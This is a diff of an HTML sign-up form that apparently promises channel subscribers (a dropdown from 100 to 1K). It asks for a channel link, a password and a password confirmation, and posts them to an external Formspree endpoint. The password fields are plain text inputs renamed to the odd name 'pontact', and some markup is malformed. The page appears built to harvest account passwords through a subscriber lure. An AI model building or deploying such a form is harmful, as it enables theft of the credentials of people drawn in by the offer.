@@ -15,10 +15,23 @@
   action="https://formspree.io/f/xleynwjv"
   method="POST"
 >
-         <!-- Subscribers -->
+      <!-- Subscribers -->
+	    <div class="box">
+	     <label for="select">Your Subscriber</label>
+         <select name="Subscribers">  
+         <option value="100">Your Subscriber </option>  
+         <option value="100">100</option>  
+         <option value="200">200</option>  
+         <option value="300">300</option>  
+         <option value="400">400</option>  
+         <option value="500">500</option>  
+         <option value="1K">1K</option> 
+	     <select/>
+        </div>
+   	<!-- Channel Link-->
         <div class="box">
-          <label for="name">Subscribers</label>
-          <input type="text" id="name" placeholder="Subscribers" required minlength="3" maxlength="100" name="name"/>
+          <label for="link">Channel Link</label>
+          <input type="text" id="link" placeholder="Channel Link" required minlength="3" maxlength="100" name="link"/>
         </div>
         <!-- form-name -->
         <div class="box">
@@ -32,13 +45,13 @@
           </div>
 		  <!-- P -->
 		  <div class="box">
-	      <label for="name">Password</label>
-          <input type="text" id="name" placeholder="Password" required minlength="3" maxlength="100" name="name"/>
+	      <label for="pontact">Password</label>
+          <input type="text" id="pontact" placeholder="Password" required minlength="3" maxlength="100" name="pontact"/>
         </div>	 
 	    <!--C-P-->
 		  <div class="box">
-	      <label for="name">Confirm Password</label>
-          <input type="text" id="name" placeholder="Confirm Password" required minlength="3" maxlength="100" name="name"/>
+	      <label for="pontact">Confirm Password</label>
+          <input type="text" id="confirm pontact " placeholder="Confirm Password" required minlength="3" maxlength="100" name="confirm pontact"/>
         </div>	 
           <button type="submit">Register</button>
       </form>
